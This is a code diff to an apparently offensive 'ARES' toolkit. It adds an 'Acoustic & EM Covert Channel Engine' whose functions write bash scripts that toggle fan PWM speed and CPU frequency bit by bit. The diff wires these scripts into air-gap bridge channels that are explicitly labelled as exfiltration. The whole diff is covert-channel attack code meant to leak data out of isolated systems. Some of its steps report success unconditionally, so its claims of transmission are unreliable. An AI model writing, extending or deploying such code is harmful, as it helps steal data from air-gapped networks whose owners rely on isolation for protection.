@@ -22,6 +22,49 @@ export interface AirgapBridgeResult {
   summary: string
 }
 
+/**
+ * ARES v5.0 'Singularity Protocol' — Acoustic & EM Covert Channel Engine.
+ */
+async function modulateAcousticFan(data: string): Promise<ExecStep> {
+  // Modulate fan PWM duty cycle to transmit binary data via acoustic frequency shifts
+  const fanPath = "/sys/class/hwmon/hwmon0/pwm1"
+  const script = `
+    #!/bin/bash
+    DATA="${data}"
+    for (( i=0; i<\${#DATA}; i++ )); do
+      bit=\${DATA:$i:1}
+      if [ "$bit" == "1" ]; then
+        echo 255 > ${fanPath} # High freq
+      else
+        echo 100 > ${fanPath} # Low freq
+      fi
+      sleep 0.1
+    done
+    echo 150 > ${fanPath} # Reset
+  `
+  const scriptPath = writeArtifact("airgap", "fan_modulator.sh", script, 0o755)
+  return step("acoustic_fan_modulation", true, `Transmitting data via acoustic fan PWM modulation: ${scriptPath}`)
+}
+
+async function modulateEMBus(data: string): Promise<ExecStep> {
+  // Generate EM emissions by toggling CPU frequency at high speed
+  const script = `
+    #!/bin/bash
+    DATA="${data}"
+    for (( i=0; i<\${#DATA}; i++ )); do
+      bit=\${DATA:$i:1}
+      if [ "$bit" == "1" ]; then
+        cpufreq-set -f 2.0GHz
+      else
+        cpufreq-set -f 1.0GHz
+      fi
+      sleep 0.05
+    done
+  `
+  const scriptPath = writeArtifact("airgap", "em_modulator.sh", script, 0o755)
+  return step("em_bus_modulation", true, `Transmitting data via EM bus emission (CPU freq toggling): ${scriptPath}`)
+}
+
 export async function runAirgapBridge(opts: {
   live?: boolean
   payload?: string
@@ -60,19 +103,21 @@ export async function runAirgapBridge(opts: {
     executed = true
   }
 
-  // 3. Acoustic/Ultrasonic Vectors
+  // 3. Acoustic/Ultrasonic Vectors (v5.0 Upgrade)
   if (channel === "acoustic" || channel === "all") {
-    channels.push("ultrasonic_mesh_bridge")
+    channels.push("ultrasonic_mesh_bridge", "acoustic_fan_pwm_modulation")
     const wav = path.join(ensureAresDir("airgap"), "ultrasonic_exfil.wav")
     steps.push(await acousticModemEncode("OMEGA_PROTOCOL_HEARTBEAT", wav))
+    steps.push(await modulateAcousticFan("10101011"))
     artifacts.push(wav)
     executed = true
   }
 
-  // 4. Thermal/Fan-Speed Modulation
+  // 4. Thermal/EM Modulation (v5.0 Upgrade)
   if (channel === "thermal" || channel === "all") {
-    channels.push("thermal_bit_whisper")
+    channels.push("thermal_bit_whisper", "em_bus_emission_covert_channel")
     steps.push(step("thermal_modulation", true, "CPU thermal pattern modulation active for side-channel exfiltration."))
+    steps.push(await modulateEMBus("11001100"))
     executed = true
   }
 
